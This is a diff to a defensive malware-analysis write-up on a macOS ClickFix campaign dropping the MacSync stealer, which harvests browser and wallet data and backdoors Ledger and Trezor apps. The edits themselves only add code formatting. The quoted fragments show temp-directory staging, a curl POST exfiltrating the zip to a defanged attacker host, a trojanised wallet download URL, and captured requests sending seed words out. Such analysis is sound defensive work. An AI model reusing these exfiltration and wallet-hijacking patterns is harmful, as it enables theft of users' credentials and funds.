@@ -12,9 +12,9 @@ ClickFix is a social-engineering technique that relies on convincing users to pe
 
 This execution chain starts with the following domain, which is often the target of various malvertising campaigns:
 
-Domain: hxxps[://]macfilearchive[.]com/s3/
+Domain: `hxxps[://]macfilearchive[.]com/s3`
 
-There is also a recent Reddit post on r/MacOS where a user has fallen victim to this specific campaign: https://www.reddit.com/r/MacOS/comments/1pramrh/did_i_mess_upcompromise_my_mac_security_any/
+There is also a recent [Reddit post](https://www.reddit.com/r/MacOS/comments/1pramrh/did_i_mess_upcompromise_my_mac_security_any) on r/MacOS where a user has fallen victim to this specific campaign.
 
 <img width="1007" height="1069" alt="fake macfilearchive.com page showing ClickFix lure with copy-paste command instructions" src="https://github.com/user-attachments/assets/dab21879-3c91-4020-9ba8-34872b43d6a5" />
 
@@ -833,14 +833,14 @@ try
 end try
 ```
 
-The information is initially collected and stored in the direct /tmp/sync[RANDOM-NUMBER]
+The information is initially collected and stored in the direct `/tmp/sync[RANDOM-NUMBER]`.
 
 ```
 set randomNumber to do shell script "echo $((RANDOM % 9000000 + 1000000))"
 set writemind to "/tmp/sync" & randomNumber & "/"
 ```
 
-The collected information is then compressed into a zip archive located at '/tmp/osalogging.zip', expanded this looks like:
+The collected information is then compressed into a zip archive located at `/tmp/osalogging.zip`, expanded this looks like:
 
 <img width="783" height="277" alt="directory tree showing exfiltrated data structure in /tmp/osalogging.zip with browser and wallet folders" src="https://github.com/user-attachments/assets/5ca34cc9-b285-4755-bbe1-a0589422cbb7" />
 
@@ -848,7 +848,7 @@ A fake compatibility error prompt is then shown to the victim:
 
 <img width="425" height="158" alt="fake macOS compatibility error dialog shown to victim after data exfiltration" src="https://github.com/user-attachments/assets/d0c4a896-5bac-4d0c-81f0-38f4bafa4b0e" />
 
-The zip archive containing all of the users sensitive information is then exfiltrated via a POST request to 'ballfrank[.]today/gate', as was shown in the previous script:
+The zip archive containing all of the users sensitive information is then exfiltrated via a POST request to `ballfrank[.]today/gate`, as was shown in the previous script:
 
 ```bash
 curl -k -X POST \
@@ -865,7 +865,7 @@ The script then has the functionality to check for two installed applications an
 
 ## Trezor Suite Application Replacement
 
-The script checks for the presence of '/Applications/Ledger Wallet.app'
+The script checks for the presence of `/Applications/Ledger Wallet.app`.
 
 If this application exists on the host, it is replaced with a backdoored version downloaded from the malicious domain:
 
@@ -907,7 +907,7 @@ This is what the loader page looks like after executing the trojanised Trezor Su
 
 <img width="1250" height="810" alt="trojanised Trezor Suite WebView loader page hosted at ballfrank.today prompting for recovery seed" src="https://github.com/user-attachments/assets/b5b07d8a-d5b3-46e2-8bbc-57f23f4353ba" />
 
-Upon entering recovery details, they are sent via a POST request to the '/modules/wallets' endpoint.
+Upon entering recovery details, they are sent via a POST request to the `/modules/wallets` endpoint.
 
 ```
 POST /modules/wallets HTTP/1.1
@@ -940,7 +940,7 @@ A likely fake error message is then returned, despite the recovery seeds being s
 
 ## Ledger Backdoor
 
-MacSync malware can target the victim’s Ledger application, if installed, by extracting a malicious App.asar and Info.plist from a ZIP archive and replacing the legitimate files.
+MacSync malware can target the victim’s Ledger application, if installed, by extracting a malicious `App.asar` and `Info.plist` from a ZIP archive and replacing the legitimate files.
 
 ```
 set LEDGERURL to "hxxps[://]ballfrank[.]today/ledger/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514"
@@ -998,7 +998,7 @@ Upon execution of the backdoored Ledger application, it tells you there was a pr
 
 <img width="1029" height="768" alt="backdoored Ledger app recovery step 3 page collecting seed words for exfiltration to ledger-gate.coupons" src="https://github.com/user-attachments/assets/28efc376-203e-444e-bfdf-c103eeef9121" />
 
-Unsurprisingly, the seed is then exfiltrated to an attacker controlled domain, this time, it's: 'main[.]ledger-gate[.]coupons'
+The seed is then exfiltrated to an attacker controlled domain, this time, it's: `main[.]ledger-gate[.]coupons`.
 
 ```
 POST /modules/wallets HTTP/1.1
@@ -1021,7 +1021,7 @@ Accept-Language: en-GB
 {"seedwords":["123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123","123"],"token":"270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514","app":"ledger","url":"file:///Applications/Ledger%20Wallet.app/Contents/Resources/app.asar/.webpack/recovery-step-3.html"}
 ```
 
-The decompiled Electron App has the main exfiltration logic under: '[UNPACKED_APP.ASAR]/.webpack/recovery-step-3.html'
+The decompiled Electron App has the main exfiltration logic under: `[UNPACKED_APP.ASAR]/.webpack/recovery-step-3.html`.
 
 ```
 continueBtn.addEventListener('click', function () {
